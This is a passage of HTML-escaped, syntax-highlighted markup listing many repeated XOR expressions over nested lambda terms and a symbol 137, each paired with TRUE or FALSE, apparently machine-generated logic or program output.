class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span 